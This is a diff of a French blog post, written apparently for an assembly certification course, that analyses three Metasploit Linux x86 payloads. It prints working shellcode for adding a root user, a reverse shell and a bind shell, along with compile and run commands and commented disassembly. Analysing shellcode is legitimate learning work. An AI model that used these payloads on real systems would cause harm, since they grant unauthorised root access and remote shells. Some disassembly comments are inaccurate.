@@ -5,9 +5,12 @@ Métasploit propose plusieurs payload présentés ci-dessous :
 <a href="../assets/images/6_01.png"><img src = "../assets/images/6_01.png"></a>
 
 
-Nous allons procéder à l'analyse de adduser, reverse_tcp_shell et .
+Nous allons procéder à l'analyse des 3 payloads suivants: 
+ - linux/x86/adduser,
+ - linux/x86/reverse_tcp_shell,
+ - linux/x86/shell/bind_tcp
 
-## Premier payload, adduser: ##
+## Premier payload, linux/x86/adduser: ##
 
 Nous générons le code avec la commande :
 ```c
@@ -27,7 +30,7 @@ unsigned char buf[] =
 "\xcd\x80\x6a\x01\x58\xcd\x80";
 ```
 
-Le shellcode est copié dans un fichier shellcode.c afin de pouvoir procéder à l'analyse.
+Le shellcode est copié dans un fichier shellcode.c afin de pouvoir procéder à l'analyse. **C'est ce fichier qui sera utilisé lors des 3 analyses**
 
 ```c
 #include <stdio.h>
@@ -57,7 +60,7 @@ Puis compilé :
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 ```
 
-Nous executons le programme et observons les modifications :
+Nous exécutons le programme et observons les modifications :
 
 ```c
 ./shellcode
@@ -71,7 +74,7 @@ Il y a effectivement un utilisateur qui vient d'être ajouté.
 
 On lance **gdb** et observons le code ci-dessous :
 
-Dans un premier temps, l'id de l'utilisateur effectif est défini à 0 soir root.
+Dans un premier temps, l'id de l'utilisateur effectif est défini à 0 soit root.
 ```c
     
     ; setreuid syscall (Fixe les ID d'utilisateur effectif et réel du processus appelant)
@@ -91,7 +94,7 @@ Le fichier /etc/passwd est ouvert en lecture, écriture.
     ; open syscall (open file /etc/passwd)
     ; int open(const char *pathname, int flags, mode_t mode);
 
-   0x08048509 <+9>:	    push   0x5			    
+   0x08048509 <+9>:	push   0x5			    
    0x0804850b <+11>:	pop    eax
    0x0804850c <+12>:	xor    ecx,ecx
    0x0804850e <+14>:	push   ecx
@@ -100,7 +103,7 @@ Le fichier /etc/passwd est ouvert en lecture, écriture.
    0x08048519 <+25>:	push   0x6374652f		;cte/
    0x0804851e <+30>:	mov    ebx,esp
    0x08048520 <+32>:	inc    ecx              
-   0x08048521 <+33>:	mov    ch,0x4			; ecx = 0x401 = s_ixoth and s_irusr (read and execute)
+   0x08048521 <+33>:	mov    ch,0x4	; ecx = 0x401 = s_ixoth and s_irusr (read and execute)
    0x08048523 <+35>:	int    0x80			    
    0x08048525 <+37>:	xchg   ebx,eax
 
@@ -138,7 +141,7 @@ puis un exit.
    0x08048559 <+89>:	pop    eax
    0x0804855a <+90>:	int    0x80	
 
-    ; exit syscal
+    ; exit syscall
 
    0x0804855c <+92>:	push   0x1
    0x0804855e <+94>:	pop    eax
@@ -197,7 +200,7 @@ more /etc/passwd | tail -1
 xophidia:Az/7vnGF2NNW6:0:0::/:/bin/bash
 ```
 
-## Second payload, reverse_tcp_shell: ##
+## Second payload, linux/x86/shell_reverse_tcp: ##
 
 La première étape consisté à genérer le shellcode et à regarder son fonctionnement :
 
@@ -213,11 +216,6 @@ unsigned char buf[] =
 "\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
 "\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
 ````
-
-La generation possède un certain nombre d'argument :
-
-```
-```
 
 Le code est ajouter au fichier shellcode.c tout comme le premier exemple puis compilé.
 
@@ -242,14 +240,16 @@ int socket(int domain, int type, int protocol);
  804850d:	cd 80                	int    0x80
 ```
 L'appel systeme dup2 permet de dupliquer les descripteurs de fichiers. 
-Cela permet de rediriger les sorties (stdin, stdout et stderr) afin de pouvoir obtenir une visu lors du reverse.
+Cela permet de rediriger les sorties (stdin, stdout et stderr) afin de pouvoir obtenir une visualisation une fois la connexion établie.
 
 ```c
-	; dup syscall
+    ; save 
+804850f:	93                   	xchg   ebx,eax
+	; dup2 syscall
 	; EAX: 0x1 EBX: 0x3 ECX: 0x2 
 	; loop while sf = 0
 
- 804850f:	93                   	xchg   ebx,eax
+ 
  8048510:	59                   	pop    ecx
  8048511:	b0 3f                	mov    al,0x3f
  8048513:	cd 80                	int    0x80
@@ -289,7 +289,7 @@ Cela permet de rediriger les sorties (stdin, stdout et stderr) afin de pouvoir o
  804853c:	52                   	push   edx
  804853d:	53                   	push   ebx
  804853e:	89 e1                	mov    ecx,esp
- 8048540:	b0 0b                	mov    al,0xb	;syscall exit
+ 8048540:	b0 0b                	mov    al,0xb	;syscall execve
  8048542:	cd 80                	int    0x80
 ````
 
@@ -312,4 +312,143 @@ Landement du shellcode :
 ./test_shellcode 
 ```
 
-## Troisième payload, : ##
+## Troisième payload, : linux/x86/shell/bind_tcp##
+
+Nous procédons pour le troisième payload de la même manière que les deux précedents.
+
+La première étape consiste à genérer le shellcode et à regarder son fonctionnement :
+
+```c
+msfvenom -p linux/x86/shell/bind_tcp --payload-options           
+Options for payload/linux/x86/shell/bind_tcp:
+
+
+       Name: Linux Command Shell, Bind TCP Stager (Linux x86)
+     Module: payload/linux/x86/shell/bind_tcp
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 110
+       Rank: Normal
+
+Provided by:
+    skape <mmiller@hick.org>
+    egypt <egypt@metasploit.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LPORT  4444             yes       The listen port
+RHOST                   no        The target address
+
+Description:
+  Spawn a command shell (staged). Listen for a connection (Linux x86)
+````
+
+```c
+msfvenom -p linux/x86/shell/bind_tcp -a x86 --platform linux -f c
+No encoder or badchars specified, outputting raw payload
+Payload size: 110 bytes
+Final size of c file: 488 bytes
+unsigned char buf[] = 
+"\x6a\x7d\x58\x99\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\x66\x81"
+"\xe3\x00\xf0\xcd\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89"
+"\xe1\xb0\x66\xcd\x80\x51\x6a\x04\x54\x6a\x02\x6a\x01\x50\x97"
+"\x89\xe1\x6a\x0e\x5b\x6a\x66\x58\xcd\x80\x97\x83\xc4\x14\x59"
+"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
+"\x66\x58\xcd\x80\xd1\xe3\xb0\x66\xcd\x80\x50\x43\xb0\x66\x89"
+"\x51\x04\xcd\x80\x93\xb6\x0c\xb0\x03\xcd\x80\x87\xdf\x5b\xb0"
+"\x06\xcd\x80\xff\xe1";
+```
+
+Cela est comme pour les deux premiers exemples, compilé puis analyser.
+
+Cette première section est chargée d'exécuter l'appel system socketcall puis sys_socket de la forme
+int socket(int domain, int type, int protocol);
+```c
+   0x08048500 <+0>:	xor    ebx,ebx
+   0x08048502 <+2>:	mul    ebx	
+   0x08048504 <+4>:	push   ebx  ; 0 protocol
+   0x08048505 <+5>:	inc    ebx	; socket call
+   0x08048506 <+6>:	push   ebx	; 1 type
+   0x08048507 <+7>:	push   0x2	; 2 domain
+   0x08048509 <+9>:	mov    ecx,esp	; args
+   0x0804850b <+11>:	mov    al,0x66
+   0x0804850d <+13>:	int    0x80	; syscall create
+```
+Ensuite nous utilisons l'appel système bind http://man7.org/linux/man-pages/man2/bind.2.html de la forme 
+int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) afin de lier l'adresse au nom du socket précedement crée.
+
+```c
+   0x0804850f <+15>:	pop    ebx	; ebx 2
+   0x08048510 <+16>:	pop    esi	; esi 1
+   0x08048511 <+17>:	push   edx	;
+   0x08048512 <+18>:	push   0x5c110002 ; port 4444
+   0x08048517 <+23>:	push   0x10
+   0x08048519 <+25>:	push   ecx
+   0x0804851a <+26>:	push   eax
+   0x0804851b <+27>:	mov    ecx,esp ; args addr
+   0x0804851d <+29>:	push   0x66
+   0x0804851f <+31>:	pop    eax
+   0x08048520 <+32>:	int    0x80
+```
+
+Nous allons écouter la connexion via l'appel système listen http://man7.org/linux/man-pages/man2/listen.2.html de la forme int listen(int sockfd, int backlog);
+Le stocket précédement crée est mis en mode passif en attente de connexion.
+
+```c
+   0x08048522 <+34>:	mov    DWORD PTR [ecx+0x4],eax
+   0x08048525 <+37>:	mov    bl,0x4	; eax = 4
+   0x08048527 <+39>:	mov    al,0x66
+   0x08048529 <+41>:	int    0x80			; syscall connect 
+```   
+
+Pour accepter les connexions entrantes, il faut utiliser l'appel système accept http://man7.org/linux/man-pages/man2/accept.2.html de la forme 
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+
+
+```c
+   0x0804852b <+43>:	inc    ebx			; ebx = 5
+   0x0804852c <+44>:	mov    al,0x66
+   0x0804852e <+46>:	int    0x80			; syscall
+
+   0x08048530 <+48>:	xchg   ebx,eax			; save the result
+```
+
+L'appel systeme dup2 permet de dupliquer les descripteurs de fichiers. 
+Cela permet de rediriger les sorties (stdin, stdout et stderr) afin de pouvoir obtenir une visu lors du reverse.
+
+```c   
+   0x08048531 <+49>:	pop    ecx			
+   0x08048532 <+50>:	push   0x3f			
+   0x08048534 <+52>:	pop    eax
+   0x08048535 <+53>:	int    0x80   
+   0x08048537 <+55>:	dec    ecx
+   0x08048538 <+56>:	jns    0x8048532 <code+50>
+```
+
+
+La commande /bin/sh est exécutée une fois la connexion établie.
+
+```c
+	; execve syscall
+	; int execve(const char *filename, char *const argv[], char *const envp[]);
+	; execute /bin/sh
+
+   0x0804853a <+58>:	push   0x68732f2f		; hs//
+   0x0804853f <+63>:	push   0x6e69622f       ; nib/
+   0x08048544 <+68>:	mov    ebx,esp
+   0x08048546 <+70>:	push   eax
+   0x08048547 <+71>:	push   ebx
+   0x08048548 <+72>:	mov    ecx,esp
+   0x0804854a <+74>:	mov    al,0xb			; execve syscall
+   0x0804854c <+76>:	int    0x80
+
+```
+
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: 
